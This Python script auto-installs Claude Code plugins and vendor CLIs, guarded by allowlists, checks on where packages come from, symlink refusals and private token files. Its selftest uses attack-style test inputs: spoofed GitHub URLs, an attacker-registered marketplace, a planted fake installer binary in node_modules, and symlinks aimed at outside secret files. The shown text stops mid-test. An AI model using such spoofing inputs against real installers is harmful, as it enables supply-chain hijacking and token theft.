#!/usr/bin/env python3
"""Install what the detected stack is missing, unattended, and say BLOCKED for what an agent cannot do (#2288). Fail closed.

The flows run unattended (owner, 2026-10-21), so a missing plugin or CLI is installed, not reported for a person to fix. It acts
only on what `stack_toolchain.py` (#2168) finds missing for a DETECTED stack, from the `toolchain` blocks of installed plugins'
descriptors: the project supplies no command, package or source.

- A plugin is installed with `claude plugin install <id> --scope local --json` (this machine only; never a committed settings
  file), and only from a marketplace on MARKETPLACES. Success is exit 0 AND `outcome: ok`. An installed plugin loads at the next
  start or `/reload-plugins`, so each one is recorded in a restart marker that `--confirm` checks after the restart.
- A CLI is installed by the first `auto_install` method that applies on this OS, after proving the package is the vendor's: an
  npm package's registry `repository.url`, or a Homebrew tap's remote, must name the descriptor's `repo`. `npm-dev` is never run
  here: adding a devDependency edits the project, so it is reported as `PR NEEDED`, a reviewed change on its own branch.
- A CLI's `token` must be present in the briefing file `.rails-flow/toolchain.env`, which is read only when git ignores it and
  does not track it, it is the file itself (not a symlink, not resolving outside the project) and its mode is 0600. No install
  step needs a token, so a token is only CHECKED present: never put in an argument, a log or an output line, and left for the
  vendor commands the developer runs (#2318 ruling).
- Every command runs with stack_toolchain's probe environment (an allowlist, the project's directories off PATH), and every
  tool (`claude`, `npm`, `brew`, `git`) must resolve outside the project. The vendor installs and `git` run from `/`. The
  `claude plugin` commands run with the project as their working directory, because `--scope local` names that project's
  `.claude/settings.local.json`; the project's own settings may then apply to the CLI, within the trusted-workspace bound of
  #1843.

Each thing an agent cannot do is one `BLOCKED` line (a missing token, a committable briefing file, a refused install, a package
from the wrong repository); with `--session-id` each is also filed as a coordination ask, which the board shows once the
coordinator raises it. The run then goes on: nothing here waits for an answer.

Exit: 0 nothing is missing or blocked (installs done, or none needed) · 1 a BLOCKED or PR NEEDED line (an unusable briefing
file is a BLOCKED line for each token it holds back) · 2 cannot judge (the stack could not be detected, or the settings or the
restart marker could not be read or trusted). Never folded into 0.
"""
from __future__ import annotations

import argparse
import json
import os
import re
import subprocess
import sys
from pathlib import Path

HERE = Path(__file__).resolve().parent
sys.path.insert(0, str(HERE))
import detect_stack  # noqa: E402
import stack_toolchain  # noqa: E402

# The only marketplaces a plugin is installed from, and the source `claude plugin marketplace add` registers for each.
MARKETPLACES = {"claude-plugins-official": "anthropics/claude-plugins-official", "claude-skills": "fmanimashaun/claude-skills"}
BRIEFING = Path(".rails-flow") / "toolchain.env"
MARKER = Path("docs") / "brain" / ".toolchain-installs.json"
INSTALL_TIMEOUT = 900  # seconds: a vendor install that hangs is BLOCKED, never a pass
COORDINATION = HERE.parent / "hooks" / "scripts" / "lib" / "coordination.py"


def run(argv: list[str], env: dict[str, str], timeout: float = INSTALL_TIMEOUT, cwd: str = "/") -> tuple[int, str]:
    """(exit code, stdout and stderr). A command that cannot start or times out is a failure, never a success. It runs from `/`
    unless the command's own meaning needs the project as its directory (`claude plugin install --scope local` names the
    project's own `.claude/settings.local.json` by where it runs)."""
    try:
        done = subprocess.run(argv, capture_output=True, text=True, timeout=timeout, stdin=subprocess.DEVNULL, env=env, cwd=cwd)
    except subprocess.TimeoutExpired:
        return 124, f"timed out after {timeout}s"
    except OSError as err:
        return 127, str(err)
    return done.returncode, (done.stdout or "") + (done.stderr or "")


def tool(name: str, project: Path) -> str | None:
    """The first `name` on the PATH entries outside the project (the probe PATH), resolved, and itself outside the project; None
    when there is none. The project never supplies the installer, and its copy ahead on PATH does not hide the system's."""
    env, _ = stack_toolchain.probe_env(project)
    for entry in env["PATH"].split(os.pathsep):
        candidate = Path(entry) / name
        if candidate.is_file() and os.access(candidate, os.X_OK):
            real = candidate.resolve()
            if not stack_toolchain.inside(real, project):
                return str(real)
    return None


def briefing(project: Path, env: dict[str, str]) -> tuple[dict[str, str], str | None]:
    """(the briefing file's variables, why it cannot be used). No file is no variables, not a problem: a token that is then
    needed is BLOCKED by name. A file git would commit is never read. `git` itself must resolve outside the project and runs with
    the probe environment, so neither a project's `node_modules/.bin/git` nor an inherited `GIT_DIR` can answer for it (#2288
    adversary)."""
    path = project / BRIEFING
    if not path.exists():
        return {}, None
    rel = str(BRIEFING)
    # The file itself, never what a link points at: a symlink is refused, and so is a path that resolves outside the project;
    # it is opened with O_NOFOLLOW so a link swapped in after these checks (its shape is judged before git is asked anything about it) is refused too. Tokens are private: a file any group or
    # other user can read is refused, 0600 only (coordinator, #2318 review).
    if path.is_symlink():
        return {}, f"the briefing file {rel} is a symlink, so it is not read"
    if not stack_toolchain.inside(path.resolve(), project):
        return {}, f"the briefing file {rel} resolves outside the project, so it is not read"
    git = tool("git", project)
    if not git:
        return {}, "git is not on PATH outside the project, so the briefing file cannot be proved ignored"
    tracked, _ = run([git, "-C", str(project), "ls-files", "--error-unmatch", "--", rel], env, 60)
    if tracked == 0:
        return {}, f"the briefing file {rel} is tracked by git: remove it from the index (git rm --cached) before it is read"
    ignored, _ = run([git, "-C", str(project), "check-ignore", "-q", "--", rel], env, 60)
    if ignored != 0:
        return {}, f"the briefing file {rel} is not ignored by git, so it could be committed: add it to .gitignore"
    try:
        fd = os.open(path, os.O_RDONLY | os.O_NOFOLLOW)
    except OSError as err:
        return {}, f"the briefing file {rel} cannot be opened: {err}"
    with os.fdopen(fd, "r", encoding="utf-8") as fh:
        mode = os.fstat(fh.fileno()).st_mode
        if mode & 0o077:
            return {}, f"the briefing file {rel} is readable by others (mode {oct(mode & 0o777)}): chmod 600 it"
        try:
            text = fh.read()
        except (OSError, UnicodeDecodeError) as err:
            return {}, f"the briefing file {rel} cannot be read: {err}"
    values: dict[str, str] = {}
    for line in text.splitlines():
        m = re.fullmatch(r"\s*(?:export\s+)?([A-Z][A-Z0-9_]*)\s*=\s*(.*?)\s*", line)
        if m and not line.lstrip().startswith("#"):
            values[m.group(1)] = m.group(2).strip("'\"")
    return values, None


def repo_of(text: str) -> str:
    """`github.com/<owner>/<repo>`, lower-cased, when the WHOLE first line is a URL whose host is github.com (npm's `git+https`,
    plain https, or git's scp form `git@github.com:owner/repo`); '' otherwise. The host is parsed, never searched for, so
    `https://evil.com/github.com/vendor/x` and `https://github.com/attacker/x#github.com/vendor/x` are not the vendor's (#2288)."""
    from urllib.parse import urlsplit
    line = (text.strip().splitlines() or [""])[0].strip()
    scp = re.fullmatch(r"git@github\.com:([^/\s]+)/([^/\s]+?)(?:\.git)?/?", line, re.I)
    if scp:
        owner, name = scp.groups()
    else:
        parts = urlsplit(re.sub(r"^git\+", "", line))
        if parts.scheme.lower() not in ("https", "http", "ssh", "git") or (parts.hostname or "").lower() != "github.com" \
                or parts.query or parts.fragment:
            return ""
        segs = [p for p in parts.path.split("/") if p]
        if len(segs) != 2:
            return ""
        owner, name = segs[0], re.sub(r"\.git$", "", segs[1])
    if not re.fullmatch(r"[A-Za-z0-9][A-Za-z0-9-]*", owner) or not re.fullmatch(r"[A-Za-z0-9._-]+", name):
        return ""
    return f"github.com/{owner}/{name}".lower()


def install_plugin(plugin_id: str, project: Path, env: dict[str, str]) -> str | None:
    """Install one plugin; None on success, else why it is BLOCKED."""
    marketplace = plugin_id.split("@", 1)[1]
    if marketplace not in MARKETPLACES:
        return f"plugin {plugin_id}: marketplace {marketplace!r} is not one plugins are installed from ({', '.join(sorted(MARKETPLACES))})"
    claude = tool("claude", project)
    if not claude:
        return f"plugin {plugin_id}: the claude CLI is not on PATH, so it cannot be installed"
    here = str(project)   # local scope is the project's own settings.local.json, and the listing then sees what the project registers
    # The add runs BEFORE the source check on purpose: the check reads the registration the add makes (or one that already exists),
    # and only an allowlisted source is ever added here; if the name is taken by another source, the check below refuses the install.
    run([claude, "plugin", "marketplace", "add", MARKETPLACES.get(marketplace, marketplace)], env, cwd=here)  # registered already is fine
    # The allowlist is on the SOURCE, not the name: a repository's settings can register a marketplace under an allowlisted name
    # that points anywhere (#2288 security review). `marketplace list --json` carries each one's source (documented).
    rc, out = run([claude, "plugin", "marketplace", "list", "--json"], env, 120, cwd=here)
    try:
        # pretty-printed or one line; anything after the array (a warning on stderr) is ignored, not a parse failure
        listed = json.JSONDecoder().raw_decode(out, out.index("["))[0] if rc == 0 and "[" in out else []
    except ValueError:
        listed = []
    entry = next((m for m in listed if isinstance(m, dict) and m.get("name") == marketplace), None) if isinstance(listed, list) else None
    if not entry or entry.get("source") != "github" or entry.get("repo") != MARKETPLACES.get(marketplace):
        got = f"{entry.get('source')}:{entry.get('repo') or entry.get('url')}" if entry else "not registered"
        return f"plugin {plugin_id}: marketplace {marketplace!r} is registered as {got}, not github:{MARKETPLACES.get(marketplace)}"
    rc, out = run([claude, "plugin", "install", plugin_id, "--scope", "local", "--json"], env, cwd=here)
    lines = [ln for ln in out.strip().splitlines() if ln.strip().startswith("{")]
    try:
        result = json.loads(lines[-1]) if lines else {}
    except ValueError:
        result = {}
    if rc == 0 and isinstance(result, dict) and result.get("outcome") == "ok":
        return None
    code = result.get("failureCode") if isinstance(result, dict) else None
    return f"plugin {plugin_id}: `claude plugin install` failed (exit {rc}{', ' + str(code) if code else ''})"


def install_cli(row: dict, project: Path, env: dict[str, str]) -> tuple[str, str | None]:
    """('installed' | 'pr' | 'blocked', detail). Tries each applicable method in order; the first that applies decides."""
    for how in row.get("auto_install") or []:
        if how.get("os") and how["os"] != sys.platform:
            continue
        package, repo = how["package"], how["repo"].lower()
        if how["method"] == "npm-dev":
            return "pr", (f"cli {row['bin']}: add it as a devDependency (`npm install {package} --save-dev`) on its own branch and "
                          f"pull request; it edits package.json, so it is a reviewed change, never made here")
        if how["method"] == "npm-global":
            npm = tool("npm", project)
            if not npm:
                continue
            rc, out = run([npm, "view", package, "repository.url"], env, 120)
            if rc != 0 or repo_of(out) != repo:
                return "blocked", f"cli {row['bin']}: npm package {package!r} names {repo_of(out) or out.strip()[:80]!r}, not {repo}"
            rc, out = run([npm, "install", "-g", package], env)
        elif how["method"] == "brew-tap":
            brew = tool("brew", project)
            if not brew:
                continue
            tap = "/".join(package.split("/")[:2])
            # The tap is added BEFORE its remote is checked: an untapped tap reports no remote, so there is nothing to check until
            # it exists. Tapping fetches formula files and runs none of them; only `brew install` below runs code, after the check.
            run([brew, "tap", tap], env)
            rc, out = run([brew, "tap-info", "--json", tap], env, 120)
            try:
                remote = (json.loads(out)[0].get("remote") or "") if rc == 0 else ""
            except (ValueError, IndexError, AttributeError):
                remote = ""
            want = repo.rsplit("/", 1)[0] + "/homebrew-" + tap.split("/")[1]
            if repo_of(remote) not in (repo, want):
                return "blocked", f"cli {row['bin']}: Homebrew tap {tap!r} comes from {remote or 'nowhere'!r}, not {repo}"
            rc, out = run([brew, "install", package], env)
        else:
            continue
        if rc == 0:
            return "installed", None
        return "blocked", f"cli {row['bin']}: `{how['method']}` install of {package} failed (exit {rc}): {out.strip()[-160:]}"
    return "blocked", f"cli {row['bin']}: no install method applies on {sys.platform}: {row['install']}"


def record(project: Path, installed: list[str]) -> Path:
    """Add the plugins just installed to the restart marker, which `--confirm` clears once each is enabled."""
    path = safe_marker(project)
    git = tool("git", project)
    if git and run([git, "-C", str(project), "ls-files", "--error-unmatch", "--", str(MARKER)],
                   stack_toolchain.probe_env(project)[0], 60)[0] == 0:
        # a marker the repository tracks came with the clone: rewriting it would leave a dirty tracked file an agent may commit
        raise UnsafeMarker(f"{MARKER} is tracked by git, so the restart marker is not written over it")
    try:
        old = json.loads(path.read_text(encoding="utf-8")) if path.is_file() else {}
    except (OSError, ValueError):
        old = {}
    old = old if isinstance(old, dict) else {}       # a marker that is not an object is not ours: start clean
    ids = sorted({i for i in (old.get("installed") or []) if plugin_id_ok(i)} | set(installed))
    path.parent.mkdir(parents=True, exist_ok=True)
    data = json.dumps({"status": "restart-pending", "installed": ids,
                       "resume_step": "restart Claude Code (or /reload-plugins), then: toolchain_install.py --confirm"}, indent=2) + "\n"
    # O_NOFOLLOW: a symlink planted after the check is refused. 0o600: the marker holds only plugin ids, but nothing else needs to
    # read it, so it is private like the briefing file beside it (#2318 CodeQL: a world-readable create mask is refused).
    fd = os.open(path, os.O_WRONLY | os.O_CREAT | os.O_TRUNC | os.O_NOFOLLOW, 0o600)
    with os.fdopen(fd, "w", encoding="utf-8") as fh:
        fh.write(data)
    return path


def plugin_id_ok(value: object) -> bool:
    """An id this script could have installed: `name@marketplace`, the marketplace on MARKETPLACES."""
    return isinstance(value, str) and bool(re.fullmatch(r"[a-z0-9][a-z0-9._-]*@[a-z0-9][a-z0-9._-]*", value)) \
        and value.split("@", 1)[1] in MARKETPLACES


class UnsafeMarker(Exception):
    pass


def safe_marker(project: Path) -> Path:
    """The marker path, refused when it or any directory between it and the project is a symlink: a cloned repository could plant
    `docs/brain` (or the marker) as a link that sends the write elsewhere (#2288 security review)."""
    here = project
    for part in MARKER.parts:
        here = here / part
        if here.is_symlink():
            raise UnsafeMarker(f"{here.relative_to(project)} is a symlink, so the restart marker is not written through it")
    return here


def confirm(project: Path, home: Path) -> tuple[int, list[str]]:
    """After the restart: is every plugin the marker recorded now enabled? Clears the marker only when all are."""
    try:
        path = safe_marker(project)
    except UnsafeMarker as err:
        return 2, [str(err)]
    if not path.is_file():
        return 0, ["no install is pending"]
    try:
        ids = json.loads(path.read_text(encoding="utf-8")).get("installed") or []
    except (OSError, ValueError, AttributeError) as err:
        return 2, [f"the restart marker {MARKER} cannot be read: {err}"]
    bad = [i for i in ids if not plugin_id_ok(i)]
    if bad or not isinstance(ids, list):
        # a marker written by this script holds only allowlisted ids; anything else came from somewhere else (a cloned repo)
        return 2, [f"the restart marker {MARKER} names {len(bad)} id(s) this script never installs, so it is not trusted"]
    enabled, problems = stack_toolchain.enabled_plugins(project, home)
    if problems:
        return 2, problems
    missing = [i for i in ids if not enabled.get(i)]
    if missing:
        return 1, [f"BLOCKED plugin {i} was installed but is not enabled after the restart" for i in missing]
    path.unlink()
    return 0, [f"confirmed enabled: {', '.join(ids)}; restart marker cleared"]


def file_asks(blocked: list[str], session_id: str, project: Path) -> list[str]:
    """Each BLOCKED line as a coordination ask (drafted; the coordinator raises it to the board). Returns any that failed."""
    failed = []
    for line in blocked:
        env, _ = stack_toolchain.probe_env(project)   # coordination.py runs git: never the project's, never with its GIT_* env
        done = subprocess.run([sys.executable, str(COORDINATION), "ask", "--session-id", session_id, "--title",
                               f"toolchain BLOCKED: {line}"[:200], "--where", str(project), "--cwd", str(project)],
                              capture_output=True, text=True, env=env)
        if done.returncode != 0:
            failed.append(f"could not file the ask for {line!r}: {(done.stderr or done.stdout).strip()[:160]}")
    return failed


def install(project: Path, home: Path, dirs: list[Path] | None = None, session_id: str | None = None) -> tuple[int, list[str]]:
    """(exit code, lines). The whole unattended pass: detect, install what applies, record, and name what is BLOCKED."""
    code, report = detect_stack.run(project, dirs if dirs is not None else detect_stack.manifest_dirs(Path(__file__).resolve()))
    if code == 2:
        return 2, [f"cannot judge the stack, so nothing is installed: {p}" for p in report.get("problems") or []]
    blocks = report.get("toolchain") or []
    if not blocks:
        return 0, ["no detected stack declares a toolchain; nothing to install"]
    enabled, problems = stack_toolchain.enabled_plugins(project, home)
    if problems:
        return 2, [f"cannot read which plugins are enabled, so nothing is installed: {p}" for p in problems]
    env, _ = stack_toolchain.probe_env(project)
    tokens, briefing_problem = briefing(project, env)
    lines: list[str] = []
    blocked: list[str] = []
    pr: list[str] = []
    installed: list[str] = []
    seen: set[str] = set()
    for block in blocks:
        for row in block.get("plugins") or []:
            if row["id"] in seen or enabled.get(row["id"]):
                seen.add(row["id"])
                continue
            seen.add(row["id"])
            why = install_plugin(row["id"], project, env)
            if why:
                blocked.append(why)
            else:
                installed.append(row["id"])
                lines.append(f"INSTALLED plugin {row['id']} (--scope local; loads after a restart or /reload-plugins)")
        for row in block.get("clis") or []:
            if row["bin"] in seen:
                continue
            seen.add(row["bin"])
            if row.get("token"):
                if briefing_problem:
                    blocked.append(f"cli {row['bin']}: {briefing_problem}")
                elif not tokens.get(row["token"]):
                    blocked.append(f"cli {row['bin']}: {row['token']} is missing from {BRIEFING}: add it there (the file stays ignored by git)")
            path, _ = stack_toolchain.locate(row, project)
            if path:
                continue
            state, detail = install_cli(row, project, env)
            if state == "installed":
                lines.append(f"INSTALLED cli {row['bin']}")
            elif state == "pr":
                pr.append(detail)
            else:
                blocked.append(detail)
    if installed:
        try:
            lines.append(f"recorded in {record(project, installed).relative_to(project)}: restart, then run --confirm")
        except (UnsafeMarker, OSError, ValueError, TypeError, AttributeError) as err:
            # the install already happened: a marker that cannot be written is BLOCKED and reported, never a crash that hides it
            blocked.append(f"the installs were not recorded for the restart: {type(err).__name__}: {err}")
    lines += [f"BLOCKED {b}" for b in blocked] + [f"PR NEEDED {p}" for p in pr]
    if session_id and blocked:
        lines += file_asks(blocked, session_id, project)
    return (1 if blocked or pr else 0), lines


def selftest() -> int:
    import tempfile
    sys.path.insert(0, str(HERE))
    import fixture_git  # noqa: E402
    global COORDINATION
    bad = 0

    def case(ok: bool, message: str) -> None:
        nonlocal bad
        if not ok:
            bad += 1
            print(f"FAIL {message}")

    with tempfile.TemporaryDirectory() as td:
        root = Path(td)
        bindir, log = root / "bin", root / "calls.log"
        bindir.mkdir()

        def fake(name: str, script: str) -> None:
            """A fake tool that logs its arguments and runs `script` (a /bin/sh body); written once, its body changed freely."""
            exe = bindir / name
            if not exe.exists():
                exe.write_text(f'#!/bin/sh\necho "{name} $*" >> "{log}"\n. "$0.body"\n', encoding="utf-8")
                exe.chmod(0o755)
            (bindir / f"{name}.body").write_text(script, encoding="utf-8")

        def calls() -> str:
            return log.read_text(encoding="utf-8") if log.exists() else ""

        plug = root / "plugins" / "tc"
        (plug / ".claude-plugin").mkdir(parents=True)
        (plug / ".claude-plugin" / "plugin.json").write_text("{}", encoding="utf-8")

        def stack(toolchain: dict) -> None:
            (plug / "stacks.json").write_text(json.dumps({"plugin": "tc", "stacks": [
                {"id": "tcs", "all": [{"file": "marker.txt"}], "descriptor": {"toolchain": toolchain}}]}), encoding="utf-8")

        home, proj = root / "home", root / "proj"
        (home / ".claude").mkdir(parents=True)
        proj.mkdir()
        fixture_git.init(proj)
        (proj / ".gitignore").write_text(".rails-flow/toolchain.env\n", encoding="utf-8")
        (proj / "marker.txt").write_text("x", encoding="utf-8")
        old_path = os.environ.get("PATH", "")
        os.environ["PATH"] = f"{bindir}{os.pathsep}/usr/bin{os.pathsep}/bin"
        listing = ('case "$*" in "plugin marketplace list --json") echo \'[{"name": "claude-plugins-official", "source": "github", '
                   '"repo": "anthropics/claude-plugins-official"}]\'; exit 0;; esac\n')
        ok_json = listing + 'echo \'{"outcome": "ok"}\'\n'
        try:
            def enable(ids: list[str]) -> None:
                (home / ".claude" / "settings.json").write_text(json.dumps({"enabledPlugins": {i: True for i in ids}}), encoding="utf-8")

            def go(session: str | None = None):
                log.unlink(missing_ok=True)
                (proj / MARKER).unlink(missing_ok=True)
                return install(proj, home, [plug], session)

            # 1. signal and plugin present: nothing runs
            stack({"plugins": [{"id": "p@claude-plugins-official", "install": "i"}]})
            enable(["p@claude-plugins-official"])
            fake("claude", ok_json)
            rc, out = go()
            case(rc == 0 and calls() == "", f"signal and plugin present changes nothing: rc={rc} calls={calls()!r}")
            # 2. signal present, plugin missing: installed at local scope and recorded
            enable([])
            rc, out = go()
            case(rc == 0 and "claude plugin install p@claude-plugins-official --scope local --json" in calls(),
                 f"a missing plugin is installed at local scope: rc={rc} {out} calls={calls()!r}")
            case("claude plugin marketplace add anthropics/claude-plugins-official" in calls(),
                 f"the marketplace is registered before the install: {calls()!r}")
            marker = json.loads((proj / MARKER).read_text(encoding="utf-8")) if (proj / MARKER).exists() else {}
            case(marker.get("installed") == ["p@claude-plugins-official"], f"the install is recorded in the restart marker: {marker}")
            mode = (proj / MARKER).stat().st_mode & 0o777 if (proj / MARKER).exists() else None
            case(mode == 0o600, f"the restart marker is created private, mode 0600: {oct(mode) if mode is not None else None}")
            # 3. install refused: BLOCKED, not recorded
            fake("claude", listing + 'case "$*" in *"plugin install"*) echo \'{"outcome": "failed", "failureCode": "needs_prompt"}\'; exit 1;; esac\n')
            rc, out = go()
            case(rc == 1 and any(l.startswith("BLOCKED plugin p@claude-plugins-official") and "needs_prompt" in l for l in out)
                 and not (proj / MARKER).exists(), f"a refused install is BLOCKED and not recorded: rc={rc} {out}")
            fake("claude", listing + 'echo "installed!"\n')
            rc, out = go()
            case(rc == 1 and not (proj / MARKER).exists(), f"exit 0 without `outcome: ok` is not an install: rc={rc} {out}")
            # a marketplace registered under an allowlisted NAME but another source is never installed from
            fake("claude", 'case "$*" in "plugin marketplace list --json") echo \'[{"name": "claude-plugins-official", "source": "github", '
                           '"repo": "attacker/market"}]\';; *"plugin install"*) echo \'{"outcome": "ok"}\';; esac\n')
            rc, out = go()
            case(rc == 1 and "plugin install" not in calls() and any("registered as github:attacker/market" in l for l in out),
                 f"a marketplace whose source is not the allowlisted one is never installed from: rc={rc} {out} {calls()!r}")
            fake("claude", 'echo "installed!"\n')
            rc, out = go()
            case(rc == 1 and not (proj / MARKER).exists(), f"exit 0 without `outcome: ok` is not an install: rc={rc} {out}")
            # 4. a marketplace off the allowlist: never installed
            fake("claude", ok_json)
            stack({"plugins": [{"id": "evil@other-market", "install": "i"}]})
            rc, out = go()
            case(rc == 1 and "plugin install" not in calls() and any("not one plugins are installed from" in l for l in out),
                 f"a plugin from another marketplace is never installed: rc={rc} {out} {calls()!r}")
            # 5. no signal: nothing happens
            (proj / "marker.txt").unlink()
            rc, out = go()
            case(rc == 0 and calls() == "", f"no signal installs nothing: rc={rc} {calls()!r}")
            (proj / "marker.txt").write_text("x", encoding="utf-8")
            # 6. token: missing is BLOCKED by name; present passes; a committable briefing file is never read
            cli = {"bin": "vcli", "install": "npm i -g vcli", "token": "VCLI_TOKEN",
                   "auto_install": [{"method": "npm-global", "package": "vcli", "repo": "github.com/vendor/vcli"}]}
            fake("vcli", "exit 0\n")
            stack({"clis": [cli]})
            rc, out = go()
            case(rc == 1 and any("VCLI_TOKEN is missing from .rails-flow/toolchain.env" in l for l in out),
                 f"a missing token is BLOCKED, naming it: rc={rc} {out}")
            (proj / ".rails-flow").mkdir()
            (proj / BRIEFING).write_text("# tokens\nVCLI_TOKEN=abc\n", encoding="utf-8")
            (proj / BRIEFING).chmod(0o644)
            rc, out = go()
            case(rc == 1 and any("readable by others (mode 0o644)" in l for l in out), f"a briefing file others can read is refused: {out}")
            (proj / BRIEFING).chmod(0o600)
            rc, out = go()
            case(rc == 0, f"a token in an ignored briefing file passes: rc={rc} {out}")
            (proj / ".gitignore").write_text("", encoding="utf-8")
            rc, out = go()
            case(rc == 1 and any("not ignored by git" in l for l in out), f"a briefing file git would commit is not read: {out}")
            (proj / ".gitignore").write_text(".rails-flow/toolchain.env\n", encoding="utf-8")
            fixture_git.run(proj, "add", "-f", str(BRIEFING))
            rc, out = go()
            case(rc == 1 and any("tracked by git" in l for l in out), f"a tracked briefing file is not read: {out}")
            fixture_git.run(proj, "rm", "--cached", "-q", str(BRIEFING))
            # an ignored briefing path that is a symlink to a file outside the project is never followed
            secret = root / "outside-secret.env"
            secret.write_text("VCLI_TOKEN=stolen\n", encoding="utf-8")
            secret.chmod(0o600)
            (proj / BRIEFING).rename(root / "briefing.bak")
            (proj / BRIEFING).symlink_to(secret)
            values, problem = briefing(proj, stack_toolchain.probe_env(proj)[0])
            case(problem is not None and "symlink" in problem and not values, f"a symlinked briefing file is not followed: {problem} {values}")
            (proj / BRIEFING).unlink()
            # a symlinked .rails-flow DIRECTORY: the file is no link itself, but it resolves outside the project
            outdir = root / "outside-dir"
            outdir.mkdir()
            (outdir / "toolchain.env").write_text("VCLI_TOKEN=stolen\n", encoding="utf-8")
            (outdir / "toolchain.env").chmod(0o600)
            (proj / ".rails-flow").rmdir()
            (proj / ".rails-flow").symlink_to(outdir, target_is_directory=True)
            values, problem = briefing(proj, stack_toolchain.probe_env(proj)[0])
            case(problem is not None and "resolves outside the project" in problem and not values,
                 f"a briefing file under a symlinked directory is not read: {problem} {values}")
            (proj / ".rails-flow").unlink()
            (proj / ".rails-flow").mkdir()
            (root / "briefing.bak").rename(proj / BRIEFING)
            # 7. CLI install: npm package from the vendor's repo is installed; from another repo it is BLOCKED and not installed
            (bindir / "vcli").unlink()
            fake("npm", 'case "$*" in "view vcli repository.url") echo "git+https://github.com/vendor/vcli.git";; esac\n')
            rc, out = go()
            case(rc == 0 and "npm install -g vcli" in calls(), f"a missing CLI is installed from the vendor's npm package: rc={rc} {out} {calls()!r}")
            fake("npm", 'case "$*" in "view vcli repository.url") echo "git+https://github.com/attacker/vcli.git";; esac\n')
            rc, out = go()
            case(rc == 1 and "npm install -g" not in calls() and any("not github.com/vendor/vcli" in l for l in out),
                 f"an npm package from another repository is never installed: rc={rc} {out} {calls()!r}")
            fake("npm", 'case "$*" in "view vcli repository.url") echo "git+https://github.com/vendor/vcli.git";; "install -g vcli") exit 1;; esac\n')
            rc, out = go()
            case(rc == 1 and any("install of vcli failed (exit 1)" in l for l in out), f"a failed CLI install is BLOCKED: {out}")
            # 8. Homebrew tap: the tap's remote must be the vendor's
            (bindir / "npm").unlink()
            (bindir / "npm.body").unlink()
            brew_cli = {"bin": "scli", "install": "brew install vendor/tap/scli",
                        "auto_install": [{"method": "brew-tap", "package": "vendor/tap/scli", "repo": "github.com/vendor/homebrew-tap"}]}
            stack({"clis": [brew_cli]})
            fake("brew", 'case "$*" in "tap-info --json vendor/tap") echo \'[{"remote": "https://github.com/vendor/homebrew-tap"}]\';; esac\n')
            rc, out = go()
            case(rc == 0 and "brew install vendor/tap/scli" in calls(), f"a CLI is installed from the vendor's tap: rc={rc} {out} {calls()!r}")
            fake("brew", 'case "$*" in "tap-info --json vendor/tap") echo \'[{"remote": "https://github.com/attacker/homebrew-tap"}]\';; esac\n')
            rc, out = go()
            case(rc == 1 and "brew install" not in calls(), f"a tap from another remote is never installed from: rc={rc} {out} {calls()!r}")
            # 9. a devDependency is a pull request, never an edit made here
            stack({"clis": [{"bin": "dcli", "install": "npm install dcli --save-dev",
                             "auto_install": [{"method": "npm-dev", "package": "dcli", "repo": "github.com/vendor/dcli"}]}]})
            rc, out = go()
            case(rc == 1 and any(l.startswith("PR NEEDED cli dcli") for l in out) and not (proj / "package.json").exists(),
                 f"a devDependency is reported as a PR, not made: rc={rc} {out}")
            # 10. the project never supplies the installer
            stack({"plugins": [{"id": "p@claude-plugins-official", "install": "i"}]})
            (bindir / "claude").unlink()
            (bindir / "claude.body").unlink()
            pbin = proj / "node_modules" / ".bin"
            pbin.mkdir(parents=True)
            (pbin / "claude").write_text(f'#!/bin/sh\necho ran > "{root / "PWNED"}"\n', encoding="utf-8")
            (pbin / "claude").chmod(0o755)
            os.environ["PATH"] = f"{pbin}{os.pathsep}{bindir}{os.pathsep}/usr/bin{os.pathsep}/bin"
            rc, out = go()
            case(not (root / "PWNED").exists() and any("claude CLI is not on PATH" in l for l in out),
                 f"a claude CLI inside the project is never run as the installer: {out}")
            os.environ["PATH"] = f"{bindir}{os.pathsep}/usr/bin{os.pathsep}/bin"
            fake("claude", ok_json)
            # 10b. a marker path through a symlink is refused, and nothing is written outside the project
            outside = root / "outside"
            outside.mkdir()
            brain = proj / "docs" / "brain"
            brain.parent.mkdir(parents=True, exist_ok=True)
            if brain.exists():
                import shutil
                shutil.rmtree(brain)
            brain.symlink_to(outside, target_is_directory=True)
            enable([])
            rc, out = install(proj, home, [plug])
            case(rc == 1 and not any(outside.iterdir()) and any("is a symlink" in l for l in out),
                 f"a symlinked docs/brain is not written through: rc={rc} {out} {list(outside.iterdir())}")
            brain.unlink()
            # 11. --confirm: cleared only when every recorded plugin is enabled
            enable([])
            go()
            rc, out = confirm(proj, home)
            case(rc == 1 and (proj / MARKER).exists(), f"--confirm with the plugin not yet enabled keeps the marker: rc={rc} {out}")
            enable(["p@claude-plugins-official"])
            rc, out = confirm(proj, home)
            case(rc == 0 and not (proj / MARKER).exists(), f"--confirm once enabled clears the marker: rc={rc} {out}")
            # 12. --session-id files each BLOCKED as a coordination ask
            fake_coord = root / "coord.py"
            fake_coord.write_text(f"import sys\nopen({str(log)!r}, 'a').write('coord ' + ' '.join(sys.argv[1:]) + '\\n')\n", encoding="utf-8")
            COORDINATION = fake_coord
            stack({"plugins": [{"id": "evil@other-market", "install": "i"}]})
            rc, out = go("sess-1")
            case("coord ask --session-id sess-1 --title toolchain BLOCKED: plugin evil@other-market" in calls(),
                 f"a BLOCKED line is filed as a coordination ask: {calls()!r}")
            # 14. repo_of parses the host: a URL that only mentions github.com/<vendor>/<repo> is not the vendor's
            for url, want in (("git+https://github.com/vendor/vcli.git", "github.com/vendor/vcli"),
                              ("https://GitHub.com/Vendor/VCLI", "github.com/vendor/vcli"),
                              ("git@github.com:vendor/vcli.git", "github.com/vendor/vcli"),
                              ("https://evil.com/github.com/vendor/vcli", ""),
                              ("https://github.com/attacker/evil#github.com/vendor/vcli", ""),
                              ("https://github.com.evil.com/vendor/vcli", ""),
                              ("https://github.com/vendor/vcli/tree/main", "")):
                case(repo_of(url) == want, f"repo_of({url!r}) is {repo_of(url)!r}, not {want!r}")
            # 15. the plugin commands run in the project (local scope is its settings.local.json); a pretty-printed listing reads
            COORDINATION = HERE.parent / "hooks" / "scripts" / "lib" / "coordination.py"
            stack({"plugins": [{"id": "p@claude-plugins-official", "install": "i"}]})
            enable([])
            fake("claude", 'case "$*" in "plugin marketplace list --json") printf \'[\\n  {\\n    "name": "claude-plugins-official",\\n    '
                           '"source": "github",\\n    "repo": "anthropics/claude-plugins-official"\\n  }\\n]\\n\'; exit 0;; '
                           '*"plugin install"*) pwd -P >> "$0.cwd"; echo \'{"outcome": "ok"}\';; esac\n')
            rc, out = go()
